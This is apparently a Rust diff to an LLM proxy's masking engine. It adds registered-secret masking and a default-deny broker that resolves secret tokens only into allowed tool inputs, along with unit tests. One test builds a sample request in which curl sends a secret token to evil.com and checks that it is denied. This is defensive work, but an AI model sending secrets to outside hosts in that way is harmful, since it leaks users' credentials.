@@ -6,6 +6,7 @@
 //! vs unmask. This crate is runtime-free (synchronous); the proxy calls it from
 //! async handlers.
 
+mod broker;
 mod cache;
 mod config;
 mod detect;
@@ -14,6 +15,7 @@ mod manifest;
 #[cfg(feature = "ml")]
 pub mod ml;
 mod recognizers;
+mod secrets;
 mod store;
 mod surface;
 mod token;
@@ -23,19 +25,26 @@ pub use config::{
     ExposureRedactionScope, MlConfig, Operator, Profile, Quantization, RevealMarker, SaltScope,
 };
 pub use error::EngineError;
+pub use broker::{BrokerAllow, BrokerDecision, BrokerPolicy, DenyReason, DestRule};
 pub use manifest::{ManifestEntry, MaskOutcome, MaskStats, UnmaskManifest};
+pub use secrets::{SecretRule, SecretValue};
+pub use store::{Revealed, TokenKind};
 pub use surface::{Direction, Surface};
-pub use token::{MAX_TOKEN_LEN, TOKEN_HASH_HEX_LEN, make_token, token_regex};
+pub use token::{
+    BROKER_PREFIX, MAX_TOKEN_LEN, TOKEN_HASH_HEX_LEN, is_broker_token, make_token, token_regex,
+};
 
 use std::borrow::Cow;
 use std::sync::{Arc, Mutex, RwLock};
 
 use cache::{CacheKey, CachedDetection, DetectionCache, hash_text};
 use detect::{
-    CompiledCustom, compile_customs, resolve_operator, run_detection, run_detection_batch,
+    CompiledCustom, compile_customs, resolve_operator, resolve_overlaps, run_detection,
+    run_detection_batch,
 };
+use secrets::{CompiledSecret, SecretSet, compile_secrets, detect_secrets, secrets_fingerprint};
 use store::SessionStore;
-use token::hash_value;
+use token::{hash_value, make_hash_token};
 
 /// The masking *policy*: the config, its compiled custom rules, and a precomputed
 /// fingerprint of every detection-affecting input. Stored as an immutable
@@ -60,6 +69,21 @@ impl Policy {
         // old config field parseable for compatibility, but do not let persisted
         // `fail_closed = false` or stale control-plane clients weaken the policy.
         config.fail_closed = true;
+        // `Operator::Broker` is reachable ONLY via a registered secret (it needs a
+        // secret name + a broker rule); reject it in the serialized PII operator
+        // surface so it can never appear in `WireConfig`/`GET /zlauder/config`.
+        if config.default_operator == Operator::Broker
+            || config
+                .entity_operators
+                .values()
+                .any(|op| *op == Operator::Broker)
+        {
+            return Err(EngineError::InvalidSecret(
+                "Operator::Broker is only valid for a registered secret, \
+                 not default_operator/entity_operators"
+                    .into(),
+            ));
+        }
         let customs = compile_customs(&config.custom_replacements)?;
         let policy_fp = config.detection_fingerprint();
         Ok(Self {
@@ -223,6 +247,15 @@ pub struct MaskEngine {
     /// blocking-pool threads, which is exactly the intent. Acquired per-inference
     /// (not per-walk) so a Ready-rescan can't freeze a second window (Component 2).
     ml_gate: Mutex<()>,
+    /// Registered-secret channel (Pass-0 exact-literal detection), held OFF
+    /// `EngineConfig` so values never serialize into `WireConfig`/`GET /config`/the
+    /// monitor. Hot-swappable `Arc` like `policy`, so determinism survives a secret
+    /// swap (already-minted broker tokens keep resolving).
+    secrets: RwLock<Arc<SecretSet>>,
+    /// Broker resolution policy (default-deny). Held OFF `EngineConfig` like
+    /// `secrets`; consulted only at the tool-input boundary by
+    /// [`MaskEngine::broker_resolve_pointers`]. Hot-swappable.
+    broker_policy: RwLock<Arc<BrokerPolicy>>,
 }
 
 impl MaskEngine {
@@ -280,6 +313,8 @@ impl MaskEngine {
             store: Mutex::new(make_store()),
             cache: DetectionCache::new(cache_cap),
             ml_gate: Mutex::new(()),
+            secrets: RwLock::new(Arc::new(SecretSet::empty())),
+            broker_policy: RwLock::new(Arc::new(BrokerPolicy::default())),
         })
     }
 
@@ -342,8 +377,72 @@ impl MaskEngine {
             *slot = Arc::new(policy);
         }
         // Live cap (audit #10): `0` clears + disables the cache without a restart.
+        // NOTE: `set_config` deliberately leaves the separate `secrets` slot
+        // untouched — secrets are reinstalled via `set_secret_rules`, never carried
+        // on `EngineConfig`.
         self.cache.set_cap(cache_cap);
         Ok(())
+    }
+
+    /// Install (hot-swap) the registered-secret set. Recompiles matchers and
+    /// recomputes `secrets_fp`; the session store is untouched (already-minted broker
+    /// tokens keep resolving). A registration error (invalid operator, empty value,
+    /// broker slug collision) leaves the previous set in place. Registering/rotating
+    /// moves `secrets_fp` → a fresh cache key space (stale detections age out by LRU).
+    pub fn set_secret_rules(&self, rules: Vec<SecretRule>) -> Result<(), EngineError> {
+        let compiled = compile_secrets(rules)?;
+        let secrets_fp = secrets_fingerprint(&compiled);
+        let set = SecretSet {
+            compiled,
+            secrets_fp,
+        };
+        let mut slot = self.secrets.write().expect("secrets rwlock poisoned");
+        *slot = Arc::new(set);
+        Ok(())
+    }
+
+    /// Number of registered secrets currently installed.
+    pub fn secret_count(&self) -> usize {
+        self.secrets
+            .read()
+            .expect("secrets rwlock poisoned")
+            .compiled
+            .len()
+    }
+
+    /// Install (hot-swap) the broker policy (default-deny base + allow rules).
+    pub fn set_broker_policy(&self, policy: BrokerPolicy) {
+        let mut slot = self
+            .broker_policy
+            .write()
+            .expect("broker_policy rwlock poisoned");
+        *slot = Arc::new(policy);
+    }
+
+    /// Resolve broker tokens in a tool-input JSON value at the LOCAL tool boundary
+    /// (T2/T3), gated by the broker policy. Walks every string leaf (tracking its
+    /// RFC-6901 pointer); for each `[BROKER__…]` token it reveals the value + the
+    /// registered secret name from the store and asks the policy whether it may
+    /// resolve into `(secret, tool, pointer, leaf)`. Allowed tokens are spliced to
+    /// their real value IN PLACE; denied / unknown ones are left tokenized. PII tokens
+    /// are untouched (PII is resolved earlier, on the wire). Returns a report
+    /// (resolved count + per-pointer denials) — never the values.
+    pub fn broker_resolve_pointers(
+        &self,
+        tool: &str,
+        input: &mut serde_json::Value,
+    ) -> BrokerResolveReport {
+        let policy = Arc::clone(
+            &self
+                .broker_policy
+                .read()
+                .expect("broker_policy rwlock poisoned"),
+        );
+        let store = self.store.lock().expect("store mutex poisoned");
+        let mut report = BrokerResolveReport::default();
+        let mut pointer = String::new();
+        broker_walk(input, &mut pointer, tool, &policy, &store, &mut report);
+        report
     }
 
     /// Number of distinct tokens minted so far this session.
@@ -466,13 +565,31 @@ impl MaskEngine {
         // any detection/inference/apply work (audit #2): a slow miss or Ready-rescan
         // must never hold a read lock that could starve a live `set_config` write.
         let policy = Arc::clone(&self.policy.read().expect("policy rwlock poisoned"));
+        // Snapshot the registered-secret set (cheap `Arc` clone) alongside the policy.
+        let secrets = Arc::clone(&self.secrets.read().expect("secrets rwlock poisoned"));
 
         // Master switch off, or this surface disabled by policy → transparent
         // passthrough on the mask path (unmask still runs on the response side). This
         // early return is NOT cached (so `enabled`/`disabled_surfaces` need not be in
-        // `policy_fp`).
+        // `policy_fp`). EXCEPTION (A9): a registered secret is NOT subject to the
+        // convenience disable — it is still masked even on a disabled surface, so a
+        // known secret value can never egress in plaintext via the fast path.
         if !policy.config.enabled || !policy.config.surface_enabled(surface) {
-            return Ok(MaskOutcome::passthrough(text, MaskStats::disabled()));
+            if secrets.compiled.is_empty() {
+                return Ok(MaskOutcome::passthrough(text, MaskStats::disabled()));
+            }
+            // Resolve overlaps among registered secrets (two secrets can match
+            // overlapping spans) so `apply()` never splices overlapping ranges.
+            let dets = resolve_overlaps(detect_secrets(&secrets.compiled, text, surface));
+            if dets.is_empty() {
+                return Ok(MaskOutcome::passthrough(text, MaskStats::disabled()));
+            }
+            let (out, manifest) = self.apply(text, surface, &policy.config, &dets)?;
+            return Ok(MaskOutcome {
+                masked_text: out,
+                manifest,
+                stats: MaskStats::disabled(),
+            });
         }
 
         // Peel a prior turn's reveal-marker decoration off re-sent assistant history
@@ -496,6 +613,7 @@ impl MaskEngine {
             surface,
             policy_fp: policy.policy_fp,
             ml_fp,
+            secrets_fp: secrets.secrets_fp,
         };
 
         let mut stats = MaskStats {
@@ -527,6 +645,7 @@ impl MaskEngine {
                     }
                     None => self.detect_and_cache(
                         &policy,
+                        &secrets.compiled,
                         ml.as_deref(),
                         text,
                         surface,
@@ -535,7 +654,9 @@ impl MaskEngine {
                     )?,
                 }
             }
-            None => self.detect_and_cache(&policy, None, text, surface, key, &mut stats)?,
+            None => {
+                self.detect_and_cache(&policy, &secrets.compiled, None, text, surface, key, &mut stats)?
+            }
         };
 
         // Apply loop — runs EVERY call (hit or miss): resolve operators from the LIVE
@@ -543,9 +664,30 @@ impl MaskEngine {
         // rebuild the per-call manifest. The replay is REQUIRED, not just for stats:
         // custom literal tokens unmask only via this manifest, so the masked string
         // cannot itself be cached.
+        let (out, manifest) = self.apply(text, surface, &policy.config, &dets)?;
+
+        Ok(MaskOutcome {
+            masked_text: out,
+            manifest,
+            stats,
+        })
+    }
+
+    /// Splice detections into `text` (back-to-front so byte offsets stay valid),
+    /// minting tokens / rendering operators and building the per-call manifest.
+    /// Shared by the normal mask path, the secrets-only disabled-surface path, and
+    /// the user-bypass secret scan.
+    fn apply(
+        &self,
+        text: &str,
+        surface: Surface,
+        cfg: &EngineConfig,
+        dets: &[CachedDetection],
+    ) -> Result<(String, UnmaskManifest), EngineError> {
         let mut manifest = UnmaskManifest::new();
         let mut out = text.to_string();
-        // Splice back-to-front so original byte offsets stay valid.
+        // One salt grab for the salted `Hash` render of registered secrets.
+        let salt = *self.store.lock().expect("store mutex poisoned").salt();
         for d in dets.iter().rev() {
             // Detector offsets are char-aligned in practice (regex over `&str`), but
             // if one ever isn't, `&text[start..end]` would panic and poison the store
@@ -554,11 +696,19 @@ impl MaskEngine {
             // panic, and never leave it as plaintext, which skipping the span would).
             let (start, end) = snap_to_char_boundary(text, d.start, d.end);
             let slice = &text[start..end];
-            let replacement = match resolve_operator(&policy.config, d) {
+            let replacement = match resolve_operator(cfg, d) {
                 Operator::Keep => continue,
                 Operator::Redact => "[REDACTED]".to_string(),
                 Operator::Mask { char, from_end } => mask_value(slice, char, from_end),
-                Operator::Hash => hash_value(&d.entity_type, slice),
+                Operator::Hash => {
+                    // Registered secrets get the SALTED colon-form render (defeats the
+                    // cross-project confirmation oracle); auto-PII Hash stays bare.
+                    if d.secret_op.is_some() {
+                        make_hash_token(&d.entity_type, slice, &salt)
+                    } else {
+                        hash_value(&d.entity_type, slice)
+                    }
+                }
                 Operator::Token => {
                     let token = {
                         let mut store = self.store.lock().expect("store mutex poisoned");
@@ -575,18 +725,33 @@ impl MaskEngine {
                         entity_kind: d.entity_type.clone(),
                         arrow_origin: surface,
                         exposed_at: Some(start..start + token.len()),
+                        broker: false,
+                    });
+                    token
+                }
+                Operator::Broker => {
+                    // `entity_type` is the EXACT registered secret name (the policy
+                    // authority); `intern_broker` slugifies it for the token entity and
+                    // stores the verbatim name on the entry. Resolvable only at the
+                    // tool-input boundary (Phase-4) — refused on display.
+                    let token = {
+                        let mut store = self.store.lock().expect("store mutex poisoned");
+                        store.intern_broker(&d.entity_type, slice, None)?
+                    };
+                    manifest.push(ManifestEntry {
+                        canonical_form: slice.to_string(),
+                        token_handle: token.clone(),
+                        entity_kind: d.entity_type.clone(),
+                        arrow_origin: surface,
+                        exposed_at: Some(start..start + token.len()),
+                        broker: true,
                     });
                     token
                 }
             };
             out.replace_range(start..end, &replacement);
         }
-
-        Ok(MaskOutcome {
-            masked_text: out,
-            manifest,
-            stats,
-        })
+        Ok((out, manifest))
     }
 
     /// Batched detection PREWARM — the throughput lever for ML-active turns.
@@ -626,6 +791,10 @@ impl MaskEngine {
         if !policy.config.enabled {
             return; // master switch off ⇒ `mask` early-returns passthrough, no detection
         }
+        // Snapshot the registered-secret set (cheap `Arc` clone) alongside the policy,
+        // so the prewarmed key space matches the per-leaf `mask` key (which folds in
+        // `secrets_fp`) and Pass-0 secrets are detected in the batched path too.
+        let secrets = Arc::clone(&self.secrets.read().expect("secrets rwlock poisoned"));
         // Snapshot the ML recognizer + its fingerprint together (atomic across an ML
         // transition, audit #1). `None` unless `Ready` ⇒ nothing worth batching.
         let (ml, ml_fp) = self.ml_snapshot_with_fp();
@@ -655,6 +824,7 @@ impl MaskEngine {
                 surface,
                 policy_fp: policy.policy_fp,
                 ml_fp,
+                secrets_fp: secrets.secrets_fp,
             };
             if self.cache.get(&key).is_some() {
                 continue; // already detected (this turn or a prior one)
@@ -692,6 +862,7 @@ impl MaskEngine {
                 &self.analyzer,
                 &policy.config,
                 &policy.customs,
+                &secrets.compiled,
                 ml.as_ref(),
                 &batch,
             )
@@ -721,6 +892,12 @@ impl MaskEngine {
         let mut masked_text = String::with_capacity(text.len());
         let mut manifest = UnmaskManifest::new();
         let mut stats = MaskStats::default();
+        // A registered secret inside a `>>…<<` bypass must NOT egress in plaintext
+        // (A9): scan each bypassed segment for registered secrets and mask those
+        // spans, leaving the rest of the bypass verbatim. The bypass is a user
+        // convenience, not a secret-exfil hatch.
+        let secrets = Arc::clone(&self.secrets.read().expect("secrets rwlock poisoned"));
+        let policy = Arc::clone(&self.policy.read().expect("policy rwlock poisoned"));
 
         for segment in segments {
             match segment {
@@ -731,7 +908,20 @@ impl MaskEngine {
                     stats.merge(&outcome.stats);
                 }
                 UserBypassSegment::Mask(_) => {}
-                UserBypassSegment::Bypass(s) => masked_text.push_str(s),
+                UserBypassSegment::Bypass(s) => {
+                    let dets = if secrets.compiled.is_empty() {
+                        Vec::new()
+                    } else {
+                        resolve_overlaps(detect_secrets(&secrets.compiled, s, Surface::UserMessage))
+                    };
+                    if dets.is_empty() {
+                        masked_text.push_str(s);
+                    } else {
+                        let (out, m) = self.apply(s, Surface::UserMessage, &policy.config, &dets)?;
+                        masked_text.push_str(&out);
+                        manifest.merge(m);
+                    }
+                }
             }
         }
 
@@ -750,6 +940,7 @@ impl MaskEngine {
     fn detect_and_cache(
         &self,
         policy: &Policy,
+        secrets: &[CompiledSecret],
         ml: Option<&dyn presidio_core::Recognizer>,
         text: &str,
         surface: Surface,
@@ -763,6 +954,7 @@ impl MaskEngine {
             &self.analyzer,
             &policy.config,
             &policy.customs,
+            secrets,
             ml,
             text,
             surface,
@@ -820,6 +1012,16 @@ impl MaskEngine {
         for m in re.find_iter(text) {
             out.push_str(&text[last..m.start()]);
             let tok = m.as_str();
+            // BROKER tokens are NEVER resolved on the display path — refuse by prefix
+            // BEFORE any manifest/store lookup (a broker `ManifestEntry` carries the
+            // secret value as `canonical_form`, so a lookup here would leak it). The
+            // value reaches only the tool-input boundary (Phase 4). The store's
+            // `reveal` is also PII-kind-gated as a second layer.
+            if is_broker_token(tok) {
+                out.push_str(tok);
+                last = m.end();
+                continue;
+            }
             // Resolve to plaintext (manifest first, then the cross-turn store); only a
             // genuine resolution is wrapped — an unknown token stays verbatim.
             let plain = manifest
@@ -838,6 +1040,10 @@ impl MaskEngine {
 
         // Custom literal tokens that don't match the standard token grammar.
         for e in &manifest.entries {
+            // Never reveal a broker value on the display path.
+            if e.broker {
+                continue;
+            }
             if !re.is_match(&e.token_handle) {
                 let replacement = match marker {
                     Some(mk) => mk.wrap(&e.canonical_form),
@@ -882,6 +1088,110 @@ fn stripped_for_key<'a>(policy: &Policy, text: &'a str, surface: Surface) -> Cow
     } else {
         Cow::Borrowed(text)
     }
+}
+
+/// Outcome of [`MaskEngine::broker_resolve_pointers`]: how many broker tokens were
+/// resolved, and the per-pointer denials (reason only — never a value).
+#[derive(Clone, Debug, Default)]
+pub struct BrokerResolveReport {
+    pub resolved: usize,
+    pub denied: Vec<(String, DenyReason)>,
+}
+
+/// Recursively walk a tool-input JSON value, resolving allowed broker tokens in each
+/// string leaf (tracking the RFC-6901 `pointer`).
+fn broker_walk(
+    v: &mut serde_json::Value,
+    pointer: &mut String,
+    tool: &str,
+    policy: &BrokerPolicy,
+    store: &SessionStore,
+    report: &mut BrokerResolveReport,
+) {
+    use serde_json::Value;
+    match v {
+        Value::String(s) => {
+            if let Some(new) = broker_resolve_leaf(s, tool, pointer, policy, store, report) {
+                *s = new;
+            }
+        }
+        Value::Array(arr) => {
+            for (i, item) in arr.iter_mut().enumerate() {
+                let len = pointer.len();
+                pointer.push('/');
+                pointer.push_str(&i.to_string());
+                broker_walk(item, pointer, tool, policy, store, report);
+                pointer.truncate(len);
+            }
+        }
+        Value::Object(map) => {
+            for (k, item) in map.iter_mut() {
+                let len = pointer.len();
+                pointer.push('/');
+                pointer.push_str(&rfc6901_escape(k));
+                broker_walk(item, pointer, tool, policy, store, report);
+                pointer.truncate(len);
+            }
+        }
+        _ => {}
+    }
+}
+
+/// RFC-6901 token escaping: `~` → `~0`, `/` → `~1`.
+fn rfc6901_escape(k: &str) -> String {
+    k.replace('~', "~0").replace('/', "~1")
+}
+
+/// Resolve allowed broker tokens in a single string leaf. Returns the rewritten leaf
+/// (with allowed tokens spliced to their values) or `None` if nothing changed. The
+/// policy decision uses the ORIGINAL leaf (so the destination host is parsed before
+/// any substitution).
+fn broker_resolve_leaf(
+    leaf: &str,
+    tool: &str,
+    pointer: &str,
+    policy: &BrokerPolicy,
+    store: &SessionStore,
+    report: &mut BrokerResolveReport,
+) -> Option<String> {
+    let re = token_regex();
+    let mut subs: Vec<(std::ops::Range<usize>, String)> = Vec::new();
+    let mut saw_broker = false;
+    for m in re.find_iter(leaf) {
+        let tok = m.as_str();
+        if !is_broker_token(tok) {
+            continue;
+        }
+        saw_broker = true;
+        match store.reveal_for(tok, TokenKind::Broker) {
+            Some(rev) => {
+                let name = rev.secret_name.as_deref().unwrap_or("");
+                match policy.decide(name, tool, pointer, leaf) {
+                    BrokerDecision::Resolve => {
+                        subs.push((m.range(), rev.value));
+                        report.resolved += 1;
+                    }
+                    BrokerDecision::Deny(reason) => {
+                        report.denied.push((pointer.to_string(), reason));
+                    }
+                }
+            }
+            // Unknown / expired / tombstoned broker token: leave it, count as denied.
+            None => report
+                .denied
+                .push((pointer.to_string(), DenyReason::NoRule)),
+        }
+    }
+    if !saw_broker || subs.is_empty() {
+        return None;
+    }
+    // Splice back-to-front so earlier byte ranges stay valid.
+    subs.sort_by(|a, b| b.0.start.cmp(&a.0.start));
+    let mut out = leaf.to_string();
+    for (range, value) in subs {
+        out.replace_range(range, &value);
+    }
+    Some(out)
 }
 
 /// Widen `[start, end)` outward to the nearest UTF-8 char boundaries (and clamp to
@@ -1909,8 +2219,10 @@ mod tests {
         let cfg = EngineConfig::default();
         let customs = detect::compile_customs(&cfg.custom_replacements).unwrap();
         let text = "ping bob@example.com";
-        let a = run_detection(&analyzer, &cfg, &customs, None, text, Surface::UserMessage).unwrap();
-        let b = run_detection(&analyzer, &cfg, &customs, None, text, Surface::UserMessage).unwrap();
+        let a =
+            run_detection(&analyzer, &cfg, &customs, &[], None, text, Surface::UserMessage).unwrap();
+        let b =
+            run_detection(&analyzer, &cfg, &customs, &[], None, text, Surface::UserMessage).unwrap();
         assert_eq!(a.len(), 1, "one EMAIL detection");
         assert_eq!(a.len(), b.len());
         assert_eq!(a[0].start, b[0].start);
@@ -2201,5 +2513,260 @@ mod tests {
         // masks the marker.
         let out = e.mask("ZZMARK", Surface::UserMessage).unwrap();
         assert!(out.masked_text.contains("[EMAIL_ADDRESS_"));
+    }
+
+    // ----- Registered secrets (Pass-0) -----------------------------------------
+
+    fn secret_rule(name: &str, value: &str, op: Operator) -> SecretRule {
+        SecretRule {
+            name: name.into(),
+            value: SecretValue::new(value),
+            operator: op,
+            case_sensitive: true,
+            apply_to_surfaces: None,
+        }
+    }
+
+    // `hash` (ex-"guard"): salted colon-form, never interned, unmask is a no-op.
+    #[test]
+    fn hash_secret_masks_and_is_never_revealable() {
+        let e = engine();
+        e.set_secret_rules(vec![secret_rule("db_pw", "S3cretPlaintext!", Operator::Hash)])
+            .unwrap();
+        let out = e
+            .mask("connect with S3cretPlaintext! now", Surface::UserMessage)
+            .unwrap();
+        assert!(
+            !out.masked_text.contains("S3cretPlaintext!"),
+            "value leaked: {}",
+            out.masked_text
+        );
+        assert!(
+            out.masked_text.contains("[DB_PW:"),
+            "salted colon-form hash render: {}",
+            out.masked_text
+        );
+        assert!(out.manifest.is_empty(), "hash mints no reversible entry");
+        // Colon-form is outside `token_regex` ⇒ unmask is a no-op.
+        let back = e.unmask(&out.masked_text, &out.manifest).unwrap();
+        assert_eq!(back, out.masked_text, "unmask is a no-op on a hash token");
+    }
+
+    #[test]
+    fn redact_secret_collapses() {
+        let e = engine();
+        e.set_secret_rules(vec![secret_rule("pin", "1234", Operator::Redact)])
+            .unwrap();
+        let out = e.mask("pin is 1234 ok", Surface::UserMessage).unwrap();
+        assert!(out.masked_text.contains("[REDACTED]"));
+        assert!(!out.masked_text.contains("1234"));
+    }
+
+    // `broker`: minted as `[BROKER__NAME_hex]`; the display unmask REFUSES it.
+    #[test]
+    fn broker_secret_minted_and_display_refused() {
+        let e = engine();
+        e.set_secret_rules(vec![secret_rule("api_key", "sk-LIVE-9999", Operator::Broker)])
+            .unwrap();
+        let out = e.mask("use sk-LIVE-9999 here", Surface::UserMessage).unwrap();
+        assert!(
+            !out.masked_text.contains("sk-LIVE-9999"),
+            "broker value leaked: {}",
+            out.masked_text
+        );
+        assert!(
+            out.masked_text.contains("[BROKER__API_KEY_"),
+            "broker token: {}",
+            out.masked_text
+        );
+        // Display path must NOT resolve a broker token, even WITH the manifest.
+        let shown = e.unmask(&out.masked_text, &out.manifest).unwrap();
+        assert!(
+            !shown.contains("sk-LIVE-9999"),
+            "display unmask leaked broker value: {shown}"
+        );
+        assert!(
+            shown.contains("[BROKER__API_KEY_"),
+            "broker token must be refused verbatim on display"
+        );
+        // ...also via the assistant (marker-capable) display path.
+        let shown2 = e.unmask_assistant(&out.masked_text, &out.manifest).unwrap();
+        assert!(!shown2.contains("sk-LIVE-9999"));
+    }
+
+    // A9: a registered secret that also matches the allow-list is STILL masked.
+    #[test]
+    fn secret_is_exempt_from_allow_list() {
+        let mut cfg = EngineConfig::default();
+        cfg.allow_list.add_exact("OPENSESAME");
+        let e = MaskEngine::new(cfg).unwrap();
+        e.set_secret_rules(vec![secret_rule("magic", "OPENSESAME", Operator::Hash)])
+            .unwrap();
+        let out = e.mask("say OPENSESAME please", Surface::UserMessage).unwrap();
+        assert!(
+            !out.masked_text.contains("OPENSESAME"),
+            "allow-list must not suppress a registered secret: {}",
+            out.masked_text
+        );
+    }
+
+    // A9: a registered secret is masked even when the engine/surface is disabled.
+    #[test]
+    fn secret_masked_even_when_engine_disabled() {
+        let e = engine();
+        e.set_secret_rules(vec![secret_rule("tok", "TOPSECRETVALUE", Operator::Hash)])
+            .unwrap();
+        e.set_enabled(false);
+        let out = e
+            .mask("here TOPSECRETVALUE there", Surface::UserMessage)
+            .unwrap();
+        assert!(
+            !out.masked_text.contains("TOPSECRETVALUE"),
+            "secret must mask even when the engine is disabled: {}",
+            out.masked_text
+        );
+        // A non-secret on a disabled engine still passes through.
+        let pii = e.mask("email a@b.com", Surface::UserMessage).unwrap();
+        assert!(
+            pii.masked_text.contains("a@b.com"),
+            "non-secret passes through when disabled"
+        );
+    }
+
+    // A9: a registered secret inside a `>>…<<` bypass is masked, not leaked.
+    #[test]
+    fn secret_masked_inside_user_bypass() {
+        let e = engine();
+        e.set_secret_rules(vec![secret_rule("tok", "LEAKME123", Operator::Hash)])
+            .unwrap();
+        let out = e
+            .mask("send >>LEAKME123 and hi<<", Surface::UserMessage)
+            .unwrap();
+        assert!(
+            !out.masked_text.contains("LEAKME123"),
+            "bypass must not leak a known secret: {}",
+            out.masked_text
+        );
+        assert!(
+            out.masked_text.contains("and hi"),
+            "non-secret bypass text stays verbatim: {}",
+            out.masked_text
+        );
+    }
+
+    #[test]
+    fn config_snapshot_omits_secret_values() {
+        let e = engine();
+        e.set_secret_rules(vec![secret_rule("db", "ULTRASECRET", Operator::Broker)])
+            .unwrap();
+        let json = serde_json::to_string(&e.config_snapshot()).unwrap();
+        assert!(
+            !json.contains("ULTRASECRET"),
+            "a secret value must never serialize into EngineConfig"
+        );
+        assert_eq!(e.secret_count(), 1);
+    }
+
+    // F2 (ship-gate): overlapping registered secrets must be overlap-resolved on the
+    // secrets-only fast path (disabled surface), never splicing overlapping ranges.
+    #[test]
+    fn overlapping_secrets_resolve_on_fast_path() {
+        let e = engine();
+        e.set_secret_rules(vec![
+            secret_rule("longval", "SUPERSECRETVALUE", Operator::Hash),
+            secret_rule("shortval", "SECRET", Operator::Redact), // substring of the above
+        ])
+        .unwrap();
+        e.set_enabled(false); // exercise the secrets-only disabled fast path
+        let out = e
+            .mask("here SUPERSECRETVALUE there", Surface::UserMessage)
+            .unwrap();
+        assert!(
+            !out.masked_text.contains("SUPERSECRETVALUE"),
+            "longer secret masked: {}",
+            out.masked_text
+        );
+        assert!(
+            !out.masked_text.contains("SECRET"),
+            "no overlapping leftover after resolve: {}",
+            out.masked_text
+        );
+    }
+
+    // Broker resolution at the tool boundary: an allowed (secret,tool,pointer,host)
+    // splices the real value; a wrong tool/host leaves the token in place.
+    #[test]
+    fn broker_resolve_pointers_respects_policy() {
+        let e = engine();
+        e.set_secret_rules(vec![secret_rule(
+            "db_password",
+            "pgpw-SECRET-1",
+            Operator::Broker,
+        )])
+        .unwrap();
+        // Mint the broker token by masking text containing the value.
+        let masked = e
+            .mask("conn pgpw-SECRET-1 here", Surface::UserMessage)
+            .unwrap();
+        let tok = token_regex()
+            .find(&masked.masked_text)
+            .expect("broker token minted")
+            .as_str()
+            .to_string();
+        assert!(tok.starts_with("[BROKER__DB_PASSWORD_"));
+
+        e.set_broker_policy(BrokerPolicy {
+            allow: vec![
+                BrokerAllow::new(
+                    Some("db_password"),
+                    "psql",
+                    "/connection_uri",
+                    Some(DestRule::HostAllowList(vec!["db.internal".into()])),
+                    None,
+                )
+                .unwrap(),
+            ],
+        });
+
+        // Allowed: psql → db.internal.
+        let mut input =
+            serde_json::json!({ "connection_uri": format!("postgres://u:{tok}@db.internal/d") });
+        let report = e.broker_resolve_pointers("psql", &mut input);
+        assert_eq!(report.resolved, 1);
+        let uri = input["connection_uri"].as_str().unwrap();
+        assert!(uri.contains("pgpw-SECRET-1"), "allowed value spliced: {uri}");
+        assert!(!uri.contains("BROKER__"));
+
+        // Denied: wrong tool (curl) to evil.com → token left in place, no value.
+        let mut input2 = serde_json::json!({ "url": format!("https://evil.com/?x={tok}") });
+        let report2 = e.broker_resolve_pointers("curl", &mut input2);
+        assert_eq!(report2.resolved, 0);
+        let url = input2["url"].as_str().unwrap();
+        assert!(url.contains("BROKER__"), "denied token left tokenized: {url}");
+        assert!(!url.contains("pgpw-SECRET-1"));
+
+        // Egress boundary: even a matching value into an MCP tool is denied.
+        let mut input3 = serde_json::json!({ "connection_uri": format!("x{tok}") });
+        let report3 = e.broker_resolve_pointers("mcp__db", &mut input3);
+        assert_eq!(report3.resolved, 0);
+    }
+
+    #[test]
+    fn broker_operator_rejected_outside_secrets_channel() {
+        let cfg = EngineConfig {
+            default_operator: Operator::Broker,
+            ..EngineConfig::default()
+        };
+        assert!(
+            MaskEngine::new(cfg).is_err(),
+            "Broker as default_operator must be rejected"
+        );
+        let mut cfg2 = EngineConfig::default();
+        cfg2.entity_operators
+            .insert("EMAIL_ADDRESS".into(), Operator::Broker);
+        assert!(
+            MaskEngine::new(cfg2).is_err(),
+            "Broker in entity_operators must be rejected"
+        );
     }
 }
